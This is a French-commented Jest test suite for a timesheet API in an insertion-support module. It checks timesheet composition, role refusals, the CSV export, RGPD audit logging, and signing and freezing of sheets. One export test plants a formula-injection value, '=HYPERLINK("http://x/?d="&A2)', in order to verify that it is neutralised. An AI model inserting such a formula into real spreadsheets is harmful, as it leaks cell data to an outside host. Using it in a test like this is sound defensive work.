// ═══════════════════════════════════════════════════════════════════════════
// PR B lot 4 — TEMPS D'ACCOMPAGNEMENT SUR POSTGRESQL RÉEL
//
// Ce que cette suite prouve, et que le `pg` simulé ne pouvait pas prouver :
//   · la feuille est composée à partir de VRAIS entretiens (`interviewer_id`,
//     `duree_minutes`, `completed_date`), de VRAIES actions (`created_by`,
//     `date_realisation` — la colonne du lot 3) et de VRAIES saisies ;
//   · le rattachement ASI passe par une participation réellement enregistrée,
//     le rattachement OCS par un poste réellement affecté ;
//   · la validation FIGE le snapshot dans le JSONB, et la feuille figée refuse
//     toute écriture ultérieure ;
//   · l'export CSV part avec ses en-têtes, sans nom de bénéficiaire, avec les
//     formules neutralisées, et le journal RGPD est écrit AVANT l'envoi ;
//   · `heuresAccompagnement` relit les mois figés et concorde avec les
//     feuilles signées ;
//   · aucun refus 4xx ne retient de connexion du pool.
// ═══════════════════════════════════════════════════════════════════════════
'use strict';

const {
  RUN, creerComptes, purger, creerSalarie, etatPool, signerChauffeur, signer, iso,
} = require('./_helpers');

jest.mock('../../src/middleware/activity-logger', () => ({
  autoLogActivity: () => (req, res, next) => next(),
  logActivity: () => {},
}));

const express = require('express');
const request = require('supertest');
const pool = require('../../src/config/database');

const app = express();
app.use(express.json());
app.use('/api/insertion', require('../../src/routes/insertion'));

jest.setTimeout(120000);

const PREFIXE = 'jest_prB_temps';
const MAT = ['PRBTPS1', 'PRBTPS2', 'PRBTPS3'];
const CODES = ['ASI-TPS-JEST', 'OCS-TPS-JEST'];
const ANNEE = 2025;
const MOIS = 6;                            // juin 2025 : 30 jours
const M = String(MOIS).padStart(2, '0');

let U; let sAsi; let sHors; let ficheIntervenant;
let projetAsi; let projetOcs; let chauffeur;

const auth = (r, role) => r.set('Authorization', `Bearer ${U[role].token}`);
const url = (uid, suffixe = '') => `/api/insertion/temps/${uid}/${ANNEE}/${MOIS}${suffixe}`;

/** Entretien réalisé, mené par `uid`, d'une durée donnée (null = non chronométré). */
async function poserEntretien(employeeId, uid, jour, duree, type = 'bilan_intermediaire') {
  const r = await pool.query(
    `INSERT INTO insertion_milestones
       (employee_id, milestone_type, titre, due_date, completed_date, status, interviewer_id, duree_minutes)
     VALUES ($1, $2, $3, $4::date, $4::date, 'realise', $5, $6) RETURNING id`,
    [employeeId, type, `Entretien ${jour}`, jour, uid, duree]);
  return r.rows[0].id;
}

/** Action CIP réalisée, créée par `uid`. */
async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de suivi') {
  const r = await pool.query(
    `INSERT INTO cip_action_plans
       (employee_id, action_label, category, status, date_realisation, duree_minutes, created_by)
     VALUES ($1, $2, 'insertion', 'realise', $3::date, $4, $5) RETURNING id`,
    [employeeId, libelle, jour, duree, uid]);
  return r.rows[0].id;
}

(RUN ? describe : describe.skip)('PR B lot 4 — temps d\'accompagnement (PostgreSQL réel)', () => {
  beforeAll(async () => {
    await purger(pool, { matricules: MAT, usernamePrefix: PREFIXE, projetCodes: CODES });
    U = await creerComptes(pool, PREFIXE, ['ADMIN', 'RH', 'MANAGER']);
    // Le rôle MANAGER a été RETIRÉ (2.52.0) : il n'atteint plus le module
    // insertion. L'INTERVENANT de ces feuilles de temps — qui était un MANAGER —
    // est désormais une seconde CIP (rôle RH), distincte de U.RH pour que la
    // règle « on ne contresigne pas sa propre feuille » reste exerçable. Le
    // jeton MANAGER reste créé : il sert à prouver le REFUS (rapport 31 § 5).
    {
      const r = await pool.query(
        `INSERT INTO users (username, email, password_hash, role, first_name, last_name, is_active)
         VALUES ($1, $2, 'x', 'RH', 'Jest', 'Manager', true)
         ON CONFLICT (username) DO UPDATE SET role = 'RH', is_active = true RETURNING id`,
        [`${PREFIXE}_interv`, `${PREFIXE}_interv@test.local`]);
      U.INTERV = {
        id: r.rows[0].id, role: 'RH',
        token: signer({ id: r.rows[0].id, username: `${PREFIXE}_interv`, role: 'RH', last_name: 'Manager' }),
      };
    }
    chauffeur = signerChauffeur(88);

    sAsi = await creerSalarie(pool, MAT[0], {
      first_name: 'Amel', last_name: 'Durand', insertion_status: 'en_parcours',
    });
    sHors = await creerSalarie(pool, MAT[1], {
      first_name: 'Karim', last_name: 'Benali', insertion_status: 'en_parcours',
    });
    // Fiche salarié de l'INTERVENANT (MANAGER) : c'est par elle que se lisent
    // sa quotité contractuelle et ses congés (cohérence).
    ficheIntervenant = await creerSalarie(pool, MAT[2], {
      first_name: 'Jest', last_name: 'Manager', weekly_hours: 35, user_id: U.INTERV.id,
    });

    // ── Deux opérations cofinancées ─────────────────────────────────────────
    // Le CODE du projet ASI porte volontairement une amorce de FORMULE : c'est
    // une colonne libre saisie par un agent, et elle finit telle quelle dans la
    // colonne « Projet » d'un fichier ouvert par la DDETS.
    const a = await pool.query(
      `INSERT INTO insertion_projets (code, nom, type, financeur, date_debut, date_fin, taux_forfaitaire_pct, actif)
       VALUES ($1, 'Accompagnement social intensif', 'asi', 'FSE+', $2::date, $3::date, 40, true) RETURNING id`,
      [CODES[0], `${ANNEE}-01-01`, `${ANNEE}-12-31`]);
    projetAsi = a.rows[0].id;
    const o = await pool.query(
      `INSERT INTO insertion_projets (code, nom, type, financeur, date_debut, date_fin, taux_forfaitaire_pct, actif)
       VALUES ($1, 'Options de coûts simplifiés', 'ocs', 'FSE+', $2::date, $3::date, 15, true) RETURNING id`,
      [CODES[1], `${ANNEE}-01-01`, `${ANNEE}-12-31`]);
    projetOcs = o.rows[0].id;

    // Le MANAGER occupe un poste sur l'OCS à 60 % : c'est ce poste qui
    // rattache une heure à l'OCS quand aucune participation ASI ne s'applique.
    await pool.query(
      `INSERT INTO insertion_projet_postes (projet_id, user_id, quotite_pct, date_debut, date_fin)
       VALUES ($1, $2, 60, $3::date, $4::date)`,
      [projetOcs, U.INTERV.id, `${ANNEE}-01-01`, `${ANNEE}-12-31`]);

    // Amel est participante ASI sur tout le mois ; Karim ne l'est pas.
    await pool.query(
      `INSERT INTO insertion_projet_participants (projet_id, employee_id, date_entree, date_sortie)
       VALUES ($1, $2, $3::date, NULL)`,
      [projetAsi, sAsi, `${ANNEE}-02-01`]);

    // ── Les faits du mois ───────────────────────────────────────────────────
    await poserEntretien(sAsi, U.INTERV.id, `${ANNEE}-${M}-03`, 60);   // → ASI
    await poserEntretien(sHors, U.INTERV.id, `${ANNEE}-${M}-05`, 45);  // → OCS (poste)
    await poserEntretien(sAsi, U.INTERV.id, `${ANNEE}-${M}-10`, null); // sans durée → AUCUNE ligne
    await poserEntretien(sAsi, U.INTERV.id, `${ANNEE}-${M}-11`, 0);    // 0 min → AUCUNE ligne
    await poserAction(sHors, U.INTERV.id, `${ANNEE}-${M}-12`, 30);     // → OCS
    // Un entretien mené par quelqu'un d'AUTRE : il ne doit pas entrer dans la
    // feuille du MANAGER.
    await poserEntretien(sAsi, U.RH.id, `${ANNEE}-${M}-13`, 90);

    // Un jour de congé de l'INTERVENANT, sur lequel on posera une saisie : la
    // cohérence doit le signaler sans rien bloquer.
    await pool.query(
      `INSERT INTO employee_leaves (employee_id, leave_type, type_category, start_date, end_date, statut, source)
       VALUES ($1, 'Congés payés été', 'holiday', $2::date, $3::date, 'valide', 'jest')`,
      [ficheIntervenant, `${ANNEE}-${M}-16`, `${ANNEE}-${M}-20`]);
  });

  afterAll(async () => {
    await purger(pool, {
      matricules: MAT, employeeIds: [sAsi, sHors, ficheIntervenant],
      usernamePrefix: PREFIXE, projetCodes: CODES,
    });
    await pool.end();
  });

  // ═════════════════════════════════════════════════════════════════════════
  // 1. Composition de la feuille
  // ═════════════════════════════════════════════════════════════════════════
  describe('composition de la feuille', () => {
    test('les lignes viennent des vrais faits — et un entretien SANS durée n\'en produit aucune', async () => {
      const r = await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
      expect(r.status).toBe(200);
      expect(r.body.statut).toBe('brouillon');
      expect(r.body.fige).toBe(false);
      // 2 entretiens chronométrés + 1 action = 3 lignes. L'entretien sans
      // durée et celui à 0 minute sont ABSENTS : on n'invente pas une dépense.
      expect(r.body.lignes.length).toBe(3);
      expect(r.body.lignes.map((l) => l.date).sort())
        .toEqual([`${ANNEE}-${M}-03`, `${ANNEE}-${M}-05`, `${ANNEE}-${M}-12`]);
      expect(r.body.lignes.filter((l) => l.activite === 'entretien').length).toBe(2);
      expect(r.body.lignes.filter((l) => l.activite === 'action').length).toBe(1);
    });

    test('l\'entretien d\'un AUTRE intervenant n\'entre pas dans cette feuille', async () => {
      const r = await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
      expect(r.body.lignes.some((l) => l.date === `${ANNEE}-${M}-13`)).toBe(false);
      const rh = await auth(request(app).get(url(U.RH.id)), 'ADMIN');
      expect(rh.body.lignes.some((l) => l.date === `${ANNEE}-${M}-13`)).toBe(true);
    });

    test('rattachement : ASI par la participation du salarié, OCS par le poste de l\'intervenant', async () => {
      const r = await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
      const parDate = Object.fromEntries(r.body.lignes.map((l) => [l.date, l]));
      // Amel est participante ASI → l'entretien du 3 est rattaché à l'ASI.
      expect(parDate[`${ANNEE}-${M}-03`].projet_code).toBe(CODES[0]);
      expect(parDate[`${ANNEE}-${M}-03`].projet_id).toBe(projetAsi);
      // Karim ne l'est pas → repli sur l'OCS, où l'intervenant a un poste.
      expect(parDate[`${ANNEE}-${M}-05`].projet_code).toBe(CODES[1]);
      expect(parDate[`${ANNEE}-${M}-12`].projet_code).toBe(CODES[1]);
    });

    test('une saisie hors projet est possible, et ressort « HORS_PROJET »', async () => {
      const r = await auth(request(app).post(url(U.INTERV.id, '/saisies')), 'ADMIN')
        .send({ date: `${ANNEE}-${M}-17`, activite: 'atelier_collectif', duree_minutes: 120, libelle: 'Atelier CV' });
      expect(r.status).toBe(201);
      const f = await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
      const l = f.body.lignes.find((x) => x.date === `${ANNEE}-${M}-17`);
      expect(l.projet_code).toBe('HORS_PROJET');
      expect(l.origine).toBe('saisie');
      expect(l.employee_id).toBeNull();
    });

    test('une saisie hors du mois est refusée en 400, sans écriture', async () => {
      const avant = await pool.query(
        'SELECT count(*)::int n FROM insertion_temps_saisies WHERE user_id = $1', [U.INTERV.id]);
      const r = await auth(request(app).post(url(U.INTERV.id, '/saisies')), 'ADMIN')
        .send({ date: `${ANNEE}-07-02`, activite: 'reunion_projet', duree_minutes: 60 });
      expect(r.status).toBe(400);
      expect(r.body.code).toBe('DATE_HORS_MOIS');
      const apres = await pool.query(
        'SELECT count(*)::int n FROM insertion_temps_saisies WHERE user_id = $1', [U.INTERV.id]);
      expect(apres.rows[0].n).toBe(avant.rows[0].n);
    });

    test('une activité hors liste est refusée par le CHECK de la base ET par le validateur', async () => {
      const r = await auth(request(app).post(url(U.INTERV.id, '/saisies')), 'ADMIN')
        .send({ date: `${ANNEE}-${M}-18`, activite: 'pause_cafe', duree_minutes: 15 });
      expect(r.status).toBe(400);
      await expect(pool.query(
        `INSERT INTO insertion_temps_saisies (user_id, date, activite, duree_minutes)
         VALUES ($1, $2::date, 'pause_cafe', 15)`, [U.INTERV.id, `${ANNEE}-${M}-18`]
      )).rejects.toMatchObject({ code: '23514' });
    });

    test('les totaux portent la quotité du poste et le taux forfaitaire de l\'opération', async () => {
      const r = await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
      const t = r.body.totaux;
      expect(t.total_minutes).toBe(60 + 45 + 30 + 120);
      expect(t.par_projet[CODES[0]]).toBe(60);
      expect(t.par_projet[CODES[1]]).toBe(75);
      expect(t.par_projet.HORS_PROJET).toBe(120);
      // Quotité : SEULEMENT pour l'OCS (le poste y est affecté). L'ASI n'en a
      // pas → la clé est ABSENTE, jamais 0 (« non renseignée » ≠ « 0 % »).
      expect(t.quotites[CODES[1]]).toBe(60);
      expect(Object.keys(t.quotites)).not.toContain(CODES[0]);
      expect(t.taux_forfaitaire[CODES[0]]).toBe(40);
      expect(t.taux_forfaitaire[CODES[1]]).toBe(15);
      expect(Object.keys(t.taux_forfaitaire)).not.toContain('HORS_PROJET');
    });

    test('cohérence : une ligne un jour de congé est SIGNALÉE, sans rien bloquer', async () => {
      const r = await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
      expect(r.body.coherence.conforme).toBe(false);
      const a = r.body.coherence.anomalies.find((x) => x.type === 'jour_absence');
      expect(a).toBeTruthy();
      expect(a.date).toBe(`${ANNEE}-${M}-17`);
      // CORRECTIF B-03 — ni le libellé de paie, ni la CATÉGORIE : le détail
      // part au financeur sur une pièce nominative, il dit qu'il y a absence
      // et rien de plus.
      expect(a.detail).not.toMatch(/Congés payés été/);
      expect(a.detail).not.toMatch(/congés|arrêt|maladie/i);
      expect(a.detail).toBe("Temps déclaré un jour d'absence déclarée de l'intervenant.");
      // Et surtout : rien n'est bloqué — l'anomalie s'imprime, elle ne refuse pas.
      expect(r.status).toBe(200);
    });

    test('la date de clôture est calculée et le dépassement signalé, jamais bloquant', async () => {
      const r = await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
      expect(r.body.date_cloture).toBe(`${ANNEE}-07-10`);   // 10 du mois suivant
      expect(r.body.cloture_depassee).toBe(true);            // juin 2025 est passé
      expect(r.body.intervenant.nom).toMatch(/MANAGER/);
    });
  });

  // ═════════════════════════════════════════════════════════════════════════
  // 2. Habilitations et périmètre
  // ═════════════════════════════════════════════════════════════════════════
  describe('périmètre', () => {
    // Rôle MANAGER RETIRÉ (2.52.0) : il ne lit plus AUCUNE feuille, pas même
    // celle d'un intervenant qu'il aurait été — refus à la porte du module.
    test('un MANAGER (rôle retiré) est refusé sur toute feuille (403), la sienne comme celle d\'un autre', async () => {
      const sienne = await auth(request(app).get(url(U.INTERV.id)), 'MANAGER');
      expect(sienne.status).toBe(403);
      const autre = await auth(request(app).get(url(U.RH.id)), 'MANAGER');
      expect(autre.status).toBe(403);
      expect(sienne.body).toEqual(autre.body);
      // L'intervenant (CIP, rôle RH) lit sa propre feuille.
      const cip = await auth(request(app).get(url(U.INTERV.id)), 'INTERV');
      expect(cip.status).toBe(200);
    });

    test('le refus est posé AVANT toute requête en base', async () => {
      // Préchauffage du cache MFA : sans lui on mesurerait la lecture de
      // `settings` par `requireMfa`, pas la garde du lot.
      await auth(request(app).get(url(U.INTERV.id)), 'MANAGER');
      const espion = jest.spyOn(pool, 'query');
      const r = await auth(request(app).get(url(U.RH.id)), 'MANAGER');
      expect(r.status).toBe(403);
      expect(espion).not.toHaveBeenCalled();
      espion.mockRestore();
    });

    test('un MANAGER n\'accède ni aux intervenants ni à la synthèse', async () => {
      const a = await auth(request(app).get('/api/insertion/temps/intervenants'), 'MANAGER');
      const b = await auth(request(app).get('/api/insertion/temps/synthese'), 'MANAGER');
      expect([a.status, b.status]).toEqual([403, 403]);
    });

    test('un jeton CHAUFFEUR est refusé', async () => {
      const r = await request(app).get(url(U.INTERV.id)).set('Authorization', `Bearer ${chauffeur}`);
      expect(r.status).toBe(403);
    });

    test('un rôle COMMUNICATION est refusé', async () => {
      const com = await creerComptes(pool, `${PREFIXE}_x`, ['COMMUNICATION']);
      const r = await request(app).get(url(U.INTERV.id))
        .set('Authorization', `Bearer ${com.COMMUNICATION.token}`);
      expect(r.status).toBe(403);
      await pool.query('DELETE FROM users WHERE username LIKE $1', [`${PREFIXE}_x%`]);
    });

    test('la liste des intervenants retient ceux qui ont réellement travaillé', async () => {
      const r = await auth(request(app).get(`/api/insertion/temps/intervenants?annee=${ANNEE}`), 'ADMIN');
      expect(r.status).toBe(200);
      const ids = r.body.map((i) => i.user_id);
      expect(ids).toContain(U.INTERV.id);
      expect(ids).toContain(U.RH.id);
      // L'ADMIN n'a mené aucun entretien et n'occupe aucun poste : il n'est pas
      // un « intervenant » — une liste de feuilles vides noierait celle qui compte.
      expect(ids).not.toContain(U.ADMIN.id);
      const mgr = r.body.find((i) => i.user_id === U.INTERV.id);
      expect(mgr.postes.some((p) => p.projet_code === CODES[1] && Number(p.quotite_pct) === 60)).toBe(true);
    });
  });

  // ═════════════════════════════════════════════════════════════════════════
  // 3. Export CSV
  // ═════════════════════════════════════════════════════════════════════════
  describe('export CSV', () => {
    test('409 EXPORT_VIDE sur un mois sans ligne — et AUCUNE trace de journal', async () => {
      const avant = await pool.query(
        `SELECT count(*)::int n FROM rgpd_audit_log WHERE action = 'EXPORT_FEUILLE_TEMPS'`);
      const r = await auth(request(app).get(`/api/insertion/temps/${U.ADMIN.id}/${ANNEE}/2/export.csv`), 'ADMIN');
      expect(r.status).toBe(409);
      expect(r.body.code).toBe('EXPORT_VIDE');
      const apres = await pool.query(
        `SELECT count(*)::int n FROM rgpd_audit_log WHERE action = 'EXPORT_FEUILLE_TEMPS'`);
      expect(apres.rows[0].n).toBe(avant.rows[0].n);
    });

    test('le fichier porte son en-tête de traçabilité, les 6 colonnes et le pied complet', async () => {
      const r = await auth(request(app).get(url(U.INTERV.id, '/export.csv')), 'ADMIN');
      expect(r.status).toBe(200);
      expect(r.headers['content-type']).toMatch(/text\/csv/);
      expect(r.headers['content-disposition']).toMatch(/attachment; filename="temps_/);
      const csv = r.text;
      expect(csv.charCodeAt(0)).toBe(0xFEFF);                       // BOM
      expect(csv).toMatch(/# Export;Feuille de temps d'accompagnement/);
      expect(csv).toMatch(/# Généré le;/);
      expect(csv).toMatch(/# Périmètre;Mois 06\/2025/);
      expect(csv).toMatch(/# Nombre de lignes;4;/);
      expect(csv).toMatch(/Date;Projet;Activité;Bénéficiaire \(identifiant interne\);Durée \(min\);Origine/);
      expect(csv).toMatch(/Total mensuel;255;minutes/);
      expect(csv).toMatch(/Quotité d'affectation : 60 %/);
      expect(csv).toMatch(/Taux forfaitaire : 40 %/);
      // Quotité inconnue sur l'ASI : dite « non renseignée », jamais « 0 % ».
      expect(csv).toMatch(/Quotité d'affectation : non renseignée/);
      expect(csv).toMatch(/Cohérence avec les congés;à expliquer/);
      expect(csv).toMatch(/Signature de l'intervenant;MANQUANTE/);
      expect(csv).toMatch(/Signature de la RH;MANQUANTE/);
      expect(csv).toMatch(/Durées déclarées par l'intervenant/);
    });

    test('le NOM du bénéficiaire n\'y figure jamais — seul son identifiant interne', async () => {
      const r = await auth(request(app).get(url(U.INTERV.id, '/export.csv')), 'ADMIN');
      expect(r.text).not.toMatch(/Durand|Amel|Benali|Karim/);
      expect(r.text).toMatch(new RegExp(`;${sAsi};`));
      expect(r.text).toMatch(new RegExp(`;${sHors};`));
    });

    test('une amorce de formule dans le code de projet est NEUTRALISÉE', async () => {
      // On renomme le code de l'ASI en une cellule piégée, le temps de l'export.
      await pool.query(`UPDATE insertion_projets SET code = $2 WHERE id = $1`,
        [projetAsi, '=HYPERLINK("http://x/?d="&A2)']);
      try {
        const r = await auth(request(app).get(url(U.INTERV.id, '/export.csv')), 'ADMIN');
        expect(r.status).toBe(200);
        // Le tableur ne doit voir qu'un texte : apostrophe de tête, puis la
        // cellule guillemetée parce qu'elle contient elle-même un guillemet.
        expect(r.text).toMatch(/"'=HYPERLINK/);
        expect(r.text).not.toMatch(/;=HYPERLINK/);
      } finally {
        await pool.query(`UPDATE insertion_projets SET code = $2 WHERE id = $1`, [projetAsi, CODES[0]]);
      }
    });

    test('l\'export est journalisé AVANT l\'envoi, avec le total mais sans nom', async () => {
      await auth(request(app).get(url(U.INTERV.id, '/export.csv')), 'ADMIN');
      const j = await pool.query(
        `SELECT details FROM rgpd_audit_log WHERE action = 'EXPORT_FEUILLE_TEMPS'
          ORDER BY id DESC LIMIT 1`);
      expect(j.rows[0].details.intervenant_id).toBe(U.INTERV.id);
      expect(j.rows[0].details.annee).toBe(ANNEE);
      expect(j.rows[0].details.total_minutes).toBe(255);
      expect(JSON.stringify(j.rows[0].details)).not.toMatch(/Durand|Benali/);
    });
  });

  // ═════════════════════════════════════════════════════════════════════════
  // 4. Signature, gel et réouverture
  // ═════════════════════════════════════════════════════════════════════════
  describe('signature, gel et réouverture', () => {
    test('la validation de l\'intervenant FIGE le snapshot en base', async () => {
      const r = await auth(request(app).post(url(U.INTERV.id, '/valider')), 'INTERV');
      expect(r.status).toBe(200);
      expect(r.body.statut).toBe('validee_intervenant');
      const ligne = await pool.query(
        'SELECT statut, lignes, totaux, coherence, validation_intervenant FROM insertion_feuilles_temps WHERE user_id = $1 AND annee = $2 AND mois = $3',
        [U.INTERV.id, ANNEE, MOIS]);
      expect(ligne.rows[0].statut).toBe('validee_intervenant');
      expect(Array.isArray(ligne.rows[0].lignes)).toBe(true);
      expect(ligne.rows[0].lignes.length).toBe(4);
      expect(ligne.rows[0].totaux.total_minutes).toBe(255);
      expect(ligne.rows[0].coherence.conforme).toBe(false);   // l'anomalie est FIGÉE avec le reste
      expect(ligne.rows[0].validation_intervenant.user_id).toBe(U.INTERV.id);
      // Aucun nom de bénéficiaire dans le snapshot : les lignes ne portent que
      // l'identifiant interne depuis leur composition.
      expect(JSON.stringify(ligne.rows[0].lignes)).not.toMatch(/Durand|Benali/);
    });

    test('une saisie ajoutée APRÈS le gel est refusée en 409, sans INSERT', async () => {
      const avant = await pool.query(
        'SELECT count(*)::int n FROM insertion_temps_saisies WHERE user_id = $1', [U.INTERV.id]);
      const r = await auth(request(app).post(url(U.INTERV.id, '/saisies')), 'ADMIN')
        .send({ date: `${ANNEE}-${M}-25`, activite: 'reunion_projet', duree_minutes: 60 });
      expect(r.status).toBe(409);
      expect(r.body.code).toBe('FEUILLE_FIGEE');
      const apres = await pool.query(
        'SELECT count(*)::int n FROM insertion_temps_saisies WHERE user_id = $1', [U.INTERV.id]);
      expect(apres.rows[0].n).toBe(avant.rows[0].n);
    });

    test('un fait nouveau ne bouge PLUS le total d\'une feuille signée', async () => {
      // Un entretien tardivement saisi pour le même mois : la feuille figée ne
      // doit pas le voir. C'est tout l'intérêt du snapshot.
      const id = await poserEntretien(sAsi, U.INTERV.id, `${ANNEE}-${M}-24`, 180);
      const r = await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
      expect(r.body.fige).toBe(true);
      expect(r.body.totaux.total_minutes).toBe(255);
      expect(r.body.lignes.some((l) => l.date === `${ANNEE}-${M}-24`)).toBe(false);
      await pool.query('DELETE FROM insertion_milestones WHERE id = $1', [id]);
    });

    test('la suppression d\'une saisie est refusée aussi tant que la feuille est figée', async () => {
      const s = await pool.query(
        'SELECT id FROM insertion_temps_saisies WHERE user_id = $1 ORDER BY id LIMIT 1', [U.INTERV.id]);
      const r = await auth(request(app).delete(`/api/insertion/temps/saisies/${s.rows[0].id}`), 'ADMIN');
      expect(r.status).toBe(409);
      expect(r.body.code).toBe('FEUILLE_FIGEE');
      const encore = await pool.query(
        'SELECT count(*)::int n FROM insertion_temps_saisies WHERE id = $1', [s.rows[0].id]);
      expect(encore.rows[0].n).toBe(1);
    });

    test('l\'intervenant ne contresigne pas sa propre feuille (409 AUTO_VALIDATION)', async () => {
      // L'intervenant (CIP, rôle RH) qui a signé le premier volet ne contresigne
      // pas sa propre feuille… (le MANAGER, rôle retiré, est refusé à la porte.)
      const m = await auth(request(app).post(url(U.INTERV.id, '/valider')), 'INTERV');
      expect(m.status).toBe(409);
      expect(m.body.code).toBe('AUTO_VALIDATION');
      expect((await auth(request(app).post(url(U.INTERV.id, '/valider')), 'MANAGER')).status).toBe(403);
      // …et la personne qui a signé le premier volet ne peut pas non plus
      // contresigner, même avec les droits RH.
      const rh = await auth(request(app).post(url(U.RH.id, '/valider')), 'RH'); // brouillon → intervenant
      expect(rh.status).toBe(200);
      const auto = await auth(request(app).post(url(U.RH.id, '/valider')), 'RH');
      expect(auto.status).toBe(409);
      expect(auto.body.code).toBe('AUTO_VALIDATION');
      const relu = await pool.query(
        'SELECT statut, validation_rh FROM insertion_feuilles_temps WHERE user_id = $1 AND annee = $2 AND mois = $3',
        [U.RH.id, ANNEE, MOIS]);
      expect(relu.rows[0].statut).toBe('validee_intervenant');
      expect(relu.rows[0].validation_rh).toBeNull();
    });

    test('la contre-signature par une AUTRE personne passe, et elle est journalisée', async () => {
      const r = await auth(request(app).post(url(U.INTERV.id, '/valider')), 'ADMIN');
      expect(r.status).toBe(200);
      expect(r.body.statut).toBe('validee_rh');
      const relu = await pool.query(
        'SELECT statut, validation_rh FROM insertion_feuilles_temps WHERE user_id = $1 AND annee = $2 AND mois = $3',
        [U.INTERV.id, ANNEE, MOIS]);
      expect(relu.rows[0].validation_rh.user_id).toBe(U.ADMIN.id);
      const j = await pool.query(
        `SELECT details FROM rgpd_audit_log WHERE action = 'INSERTION_FEUILLE_TEMPS_VALIDATION'
          ORDER BY id DESC LIMIT 1`);
      expect(j.rows[0].details.geste).toBe('validation_rh');
    });

    test('une troisième validation est refusée (transition forward-only)', async () => {
      const r = await auth(request(app).post(url(U.INTERV.id, '/valider')), 'ADMIN');
      expect(r.status).toBe(409);
      expect(r.body.code).toBe('TRANSITION_INVALIDE');
    });

    test('un mois sans aucune ligne ne peut pas être signé (409 FEUILLE_VIDE)', async () => {
      const r = await auth(request(app).post(`/api/insertion/temps/${U.ADMIN.id}/${ANNEE}/2/valider`), 'ADMIN');
      expect(r.status).toBe(409);
      expect(r.body.code).toBe('FEUILLE_VIDE');
      const n = await pool.query(
        'SELECT count(*)::int n FROM insertion_feuilles_temps WHERE user_id = $1 AND annee = $2 AND mois = 2',
        [U.ADMIN.id, ANNEE]);
      expect(n.rows[0].n).toBe(0);  // le ROLLBACK a bien tout annulé
    });

    test('la réouverture est réservée à l\'ADMIN, motivée, et efface les DEUX signatures', async () => {
      const sansMotif = await auth(request(app).post(url(U.INTERV.id, '/rouvrir')), 'ADMIN').send({});
      expect(sansMotif.status).toBe(400);

      const parRh = await auth(request(app).post(url(U.INTERV.id, '/rouvrir')), 'RH')
        .send({ motif: 'Erreur de saisie sur une durée' });
      expect(parRh.status).toBe(403);

      const r = await auth(request(app).post(url(U.INTERV.id, '/rouvrir')), 'ADMIN')
        .send({ motif: 'Erreur de saisie sur une durée d\'entretien' });
      expect(r.status).toBe(200);
      const relu = await pool.query(
        'SELECT statut, lignes, totaux, validation_intervenant, validation_rh FROM insertion_feuilles_temps WHERE user_id = $1 AND annee = $2 AND mois = $3',
        [U.INTERV.id, ANNEE, MOIS]);
      expect(relu.rows[0].statut).toBe('brouillon');
      expect(relu.rows[0].lignes).toBeNull();
      expect(relu.rows[0].validation_intervenant).toBeNull();
      expect(relu.rows[0].validation_rh).toBeNull();
      const j = await pool.query(
        `SELECT details FROM rgpd_audit_log WHERE action = 'INSERTION_FEUILLE_TEMPS_REOUVERTURE'
          ORDER BY id DESC LIMIT 1`);
      expect(j.rows[0].details.motif).toMatch(/Erreur de saisie/);
      expect(j.rows[0].details.statut_anterieur).toBe('validee_rh');
      expect(j.rows[0].details.total_minutes_anterieur).toBe(255);
    });

    test('la feuille rouverte redevient vivante et reprend les faits du mois', async () => {
      const r = await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
      expect(r.body.statut).toBe('brouillon');
      expect(r.body.fige).toBe(false);
      expect(r.body.totaux.total_minutes).toBe(255);
    });
  });

  // ═════════════════════════════════════════════════════════════════════════
  // 4 bis. Suppression d'une saisie et rattachement au bon mois
  // ═════════════════════════════════════════════════════════════════════════
  describe('suppression d\'une saisie', () => {
    test('une saisie du 1er du mois est rattachée au BON mois par la garde de gel', async () => {
      // Cas limite : `DELETE /saisies/:id` déduit le mois de la feuille depuis
      // la colonne DATE relue par le pilote. Le 1er du mois est la date où une
      // conversion de fuseau se voit — elle bascule sur le mois précédent.
      const s = await auth(request(app).post(`/api/insertion/temps/${U.RH.id}/${ANNEE}/7/saisies`), 'ADMIN')
        .send({ date: `${ANNEE}-07-01`, activite: 'reunion_projet', duree_minutes: 60, libelle: 'Comité de suivi' });
      expect(s.status).toBe(201);
      const id = s.body.id;

      // La feuille de juillet est au brouillon : la suppression doit passer.
      const d = await auth(request(app).delete(`/api/insertion/temps/saisies/${id}`), 'ADMIN');
      expect(d.status).toBe(200);
      const reste = await pool.query('SELECT count(*)::int n FROM insertion_temps_saisies WHERE id = $1', [id]);
      expect(reste.rows[0].n).toBe(0);
    });

    // CORRECTIF m-04 — pour un MANAGER, la saisie d'un autre et une saisie
    // inexistante sont INDISCERNABLES (404 dans les deux cas) : le couple
    // 404/403 énumérait les identifiants de saisie des collègues.
    test('pour un MANAGER (rôle retiré), saisie inconnue et saisie d\'un autre rendent la MÊME réponse (403)', async () => {
      const q404 = await auth(request(app).delete('/api/insertion/temps/saisies/999999999'), 'ADMIN');
      expect(q404.status).toBe(404);

      const s = await auth(request(app).post(`/api/insertion/temps/${U.RH.id}/${ANNEE}/8/saisies`), 'ADMIN')
        .send({ date: `${ANNEE}-08-04`, activite: 'autre', duree_minutes: 45 });
      expect(s.status).toBe(201);
      const autre = await auth(request(app).delete(`/api/insertion/temps/saisies/${s.body.id}`), 'MANAGER');
      const inconnue = await auth(request(app).delete('/api/insertion/temps/saisies/999999998'), 'MANAGER');
      // Rôle MANAGER RETIRÉ (2.52.0) : les deux cas restent INDISCERNABLES — ils
      // sont désormais refusés à la porte, avec la même réponse.
      expect(autre.status).toBe(403);
      expect(autre.body).toEqual(inconnue.body);
      // Et la saisie est TOUJOURS là : refuser ne veut pas dire supprimer.
      const reste = await pool.query('SELECT count(*)::int n FROM insertion_temps_saisies WHERE id = $1', [s.body.id]);
      expect(reste.rows[0].n).toBe(1);
      await pool.query('DELETE FROM insertion_temps_saisies WHERE id = $1', [s.body.id]);
    });

    test('un intervenant inconnu rend 404 et non une erreur serveur', async () => {
      const r = await auth(request(app).post(`/api/insertion/temps/999999999/${ANNEE}/${MOIS}/saisies`), 'ADMIN')
        .send({ date: `${ANNEE}-${M}-04`, activite: 'autre', duree_minutes: 30 });
      expect(r.status).toBe(404);
    });
  });

